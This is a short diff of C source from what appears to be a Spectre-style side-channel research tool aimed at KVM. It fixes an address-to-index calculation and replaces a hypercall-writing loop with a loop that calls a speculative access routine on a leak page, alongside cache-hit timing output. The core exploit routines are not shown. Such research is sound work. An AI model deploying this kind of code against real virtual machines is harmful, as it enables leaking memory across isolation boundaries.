@@ -190,7 +190,7 @@ void cmd_calc(int argc, char *argv[argc]) {
       err(EXIT_FAILURE, "Requested physical address lays before the array");
     }
 
-    size_t requested_index = (requested_phys_addr - phys_addr_of_array_start) * 8;
+    size_t requested_index = (requested_phys_addr - phys_addr_of_array_start) / 8;
     printf("Requested physical address is at index 0x%lx\n", requested_index);
   }
 }
@@ -218,7 +218,7 @@ void cmd_test_spectre(int argc, char *argv[argc], void *leak_page) {
   printf("Mins\n\tMiss: %ld\tHit: %ld\tHit?: %s\n", miss, hit, hit < CACHE_HIT_THRESHOLD ? "YES!" : "no");
 }
 
-void cmd_access_min(int argc, char *argv[argc]) {
+void cmd_access_min(int argc, char *argv[argc], void *leak_page) {
   if (argc <= 2) {
     errno = EINVAL;
     err(EXIT_FAILURE, "missing min");
@@ -230,23 +230,10 @@ void cmd_access_min(int argc, char *argv[argc]) {
     err(EXIT_FAILURE, "Could not parse min");
   }
 
-  struct self_send_ipi_hypercall opts = {.min = min};
-
-  const char *hypercall_path = "/proc/hypercall/self_send_ipi";
-  printf("Writing to '%s' in an infinte loop...\n", hypercall_path);
-  int fd = open(hypercall_path, O_WRONLY);
-  if (fd < 0) {
-    err(fd, "Failed to open %s", hypercall_path);
-  }
-
+  printf("Accessing 0x%lx...\n", min);
   while (1) {
-    int b = write(fd, &opts, sizeof(opts));
-    if (b < 0) {
-      err(errno, "Failed to write to %s", hypercall_path);
-    }
+    access_buffer_with_spectre(leak_page, min, 10000000);
   }
-
-  close(fd);
 }
 
 void cmd_inform_kvm_assist(int argc, char *argv[argc]) {
@@ -329,7 +316,7 @@ int main(int argc, char *argv[argc]) {
   } else if (!strcmp(argv[1], "test_spectre")) {
     cmd_test_spectre(argc, argv, leak_page);
   } else if (!strcmp(argv[1], "access_min")) {
-    cmd_access_min(argc, argv);
+    cmd_access_min(argc, argv, leak_page);
   } else if (!strcmp(argv[1], "find_min")) {
     size_t min = find_min(leak_page);
     printf("Min: %ld (or 0x%lx)\n", min, min);
